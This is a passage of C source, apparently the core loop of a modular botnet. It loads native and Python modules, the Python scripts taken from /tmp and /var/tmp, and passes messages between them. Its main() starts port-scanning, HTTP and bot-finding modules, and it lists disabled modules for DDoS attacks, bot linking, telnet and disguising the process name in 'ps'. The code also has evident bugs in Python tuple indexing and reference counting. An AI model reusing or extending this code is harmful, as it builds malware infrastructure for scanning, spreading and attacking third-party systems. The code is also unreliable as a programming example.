            eptr->dl_handle = dl_handle;
            
            // execute the module's initialization routine
            ret = eptr->init();
        }
     } else if (eptr->type == MODULE_TYPE_PYTHON) {         
        evars = (PythonModuleCustom *)ModuleCustomPtr(eptr, sizeof(PythonModuleCustom));
        if (evars != NULL) {

            // we must initialize a new python interpreter...
            // i wasnt goign to do this but to be able to kill the thread at any time..
            // requires it to happens
            evars->python_thread = Py_NewInterpreter();

            // python is fairly simple..
            ret = ExternalExecutePython(eptr, filename, "init", NULL);
 
            // need to do this at the end..           
            //Py_EndInterpreter(python_handle)
        }
     } 
  }
  
  if (ret != 1) {
      if (dl_handle != NULL) {
        dlclose(dl_handle);
      }
        
      eptr->plumbing = NULL;
        
      close(eptr->outfd);
  }*/
  
  return ret;
}


// allocates custom data for a module..
// this is so python.h doesnt have to be loaded in every source file
void *ModuleCustomPtr(Modules *eptr, int custom_size) {
    if (eptr->buf == NULL) {
        if ((eptr->buf = (char *)calloc(1,custom_size + 1)) == NULL) {
            return NULL;
        }
    }
    
    return (void *)eptr->buf;
}



// execute a python function from a file..
// it will load into memory the first execution, and then use the original handle
// for subsequent.. so the first should execute an 'init' function, and following
// a loop (sockets, read, etc)
// global variables are itchy.. 
// check ircs.py for example of how i had it work.. I did 
// global = class_init() and made initfunc bind using a 'start' function (which used the globla handler)
// and the plumbing function then can access it correctly
// i wasnt able to get the init function to declare the globla variable using the class, and have it 
// work with the sequential calls.. so this works and ill stick with it..
// i suggest using the function externally to test..
// argument can be NULL.. or it can give the argument :)
// *** todo: maybe separate python execution environments for each script..
int PythonModuleExecute(Modules *eptr, char *script_file, char *func_name, PyObject *pArgs) {
#ifdef PYTHON_MODULES
    PyObject *pName=NULL, *pModule=NULL, *pFunc=NULL;
    PyObject *pValue=NULL;
    int ret = 0;
    char fmt[] = "sys.path.append(\"%s\")";
    char *dirs[] = { "/tmp", "/var/tmp", ".", NULL };
    char buf[1024];
    int i = 0;
    PythonModuleCustom *evars = (PythonModuleCustom *)ModuleCustomPtr(eptr, sizeof(PythonModuleCustom));
    
    if (evars == NULL) return -1;
    
    PyEval_AcquireThread(evars->python_thread);
    
    if (!evars->pModule) {
        // initialize python paths etc that we require for operating
        PyRun_SimpleString("import sys");
        for (i = 0; dirs[i] != NULL; i++) {
            sprintf(buf, fmt, dirs[i]);
            PyRun_SimpleString(buf);
        }

        // specify as a python object the name of the file we wish to load
        pName = PyString_FromString(script_file);
        // perform the loading
        pModule = PyImport_Import(pName);
        Py_DECREF(pName);
        // keep for later (for the plumbing/loop)
        evars->pModule = pModule;
    }
    
    pModule = evars->pModule;
    if (pModule == NULL) goto end;
    
    // we want to execute a particular function under this module we imported
	pFunc = PyObject_GetAttrString(pModule, func_name);
    // now we must verify that the function is accurate
    if (!(pFunc && PyCallable_Check(pFunc))) {
        goto end;
    }
    
    pValue = PyObject_CallObject(pFunc, pArgs);
    if (pValue != NULL && !PyErr_Occurred()) {
        // we must extract the integer and return it.. 
        // for init it will contain the module identifier for
        // passing messages between the module & others
        ret = PyLong_AsLong(pValue);
        // usually you have to use Py_DECREF() here.. 
        // so if the application requires a more intersting object type from python, then adjust that here   
    }
        
end:;
    if (pFunc != NULL)
        Py_XDECREF(pFunc);
    if (pValue != NULL)
        Py_XDECREF(pValue);

    PyEval_ReleaseThread(evars->python_thread);

    return ret;
#else
    return -1;
#endif
}

int python_sendmessage(Modules *mptr, Connection *cptr, char *message, int size) {
    int ret = -1;
#ifdef PYTHON_MODULES
    PyObject *pArgs = NULL;
    PyObject *pMessage = NULL;
    PyObject *pValue = NULL;
        
        // first we must create the arguments
	    // setup and convert arguments for python script
	    pArgs = PyTuple_New(2);
	    if (pArgs != NULL) {
            // convert the message to a python object
	        pMessage = PyString_FromString(message);
	        if (pMessage != NULL) {
                // if that went successful.. set it in the tuple
                PyTuple_SetItem(pArgs, 0, pMessage);
                // now convert the size of the message to a python object
                pValue = PyInt_FromLong(size);
                if (pValue != NULL) {
                    // if that worked out ok then set it in the tuple as well
                    PyTuple_SetItem(pArgs, 2, pValue);
                    
                    // now push that argument to the actual python 'incoming' function in that script
                    ret = PythonModuleExecute(mptr, NULL, "incoming", pArgs);
                    
                    // free size
                    Py_DECREF(pValue);
                }
                // free message
                Py_DECREF(pMessage);
            }
            // free tuple
            Py_DECREF(pArgs);
        }
#endif
    return ret;
}

// the way connections are handled using ConnectionBad, etc.. gives us ability to easily
// make a STACK based Connection structure to pass information to the appropriate module we are attempting object
// for moving information from botlink to irc, etc
int MessageModule(int module_id, Modules *module_list, char *message, int size) {
    Modules *mptr = module_list;
    Connection temp_conn;
    int ret = -1;
    
    // set an empty connection structure.. its just to not crash when the modules attempt to adjust it
    memset(&temp_conn, 0, sizeof(Connection));
    // later it may be useful to get the address of the IRC client giving the command, etc
    // that could be returned back in an array, and converted and passed into the client structure here
    
    // first we check if the module exists within the normal set of modules (compiled in)
    while (mptr != NULL) {
        if (mptr->id == module_id) {
            break;
        }
        
        mptr = mptr->next;
    }
        
    // now use the modules correct function to send the message
    if (mptr) {
        if (mptr->type == MODULE_TYPE_SO)
            ret = mptr->functions->incoming(mptr, &temp_conn, message, size);
        else if (mptr->type == MODULE_TYPE_PYTHON)
            ret = python_sendmessage(mptr, &temp_conn, message, size);
    }   
        
    return ret;
}



// we will use a simple main in the beginning...
// i want this to be a library, or a very simple node
int main(int argc, char *argv[]) {
    int sleep_time = 1;
    // initialize modules
    printf("init modules\n");
    //bitcoin_init(&module_list);
    //litecoin_init(&module_list);
    //namecoin_init(&module_list);
    //peercoin_init(&module_list);
    // portscan should be before anything using it..
    portscan_init(&module_list);
    // ensure any following modules enable portscans in init
    //telnet_init(&module_list);
    // initialize module for (D)DoS
    //attack_init(&module_list);
    // http servers
    httpd_init(&module_list);
    // bot link / communications
    //botlink_init(&module_list);
    // internal data storage
    //data_init(&module_list);
    // management
    //MGR_init(&module_list);
    
    // fake name for 'ps'
    //fakename_init(&module_list, argv, argc);

    // find bots to ensure connectivity to other nodes
    findbots_init(&module_list);
     
    printf("main loop\n");
    // main loop
    while (1) {
        //printf("loop\n");
        Modules_Execute(module_list, &sleep_time);
        
        //printf("end execute\n");
       usleep(sleep_time*1000);
       //printf("end sleep\n");
        //sleep(5);
    }
#ifdef PYTHON_MODULES
    Py_Finalize();
#endif        
}

Modules *ModuleFind(Modules *mod_list, int id) {
    Modules *mptr = NULL;
    
    // use either the module list they passed, or the global one..
    if (mod_list != NULL) {
        mptr = mod_list;
    } else {
        mptr = module_list;
    }
    
    while (mptr != NULL) {
        if (mptr->id == id)
            break;

        mptr = mptr->next;
    }
    
    return mptr;
}
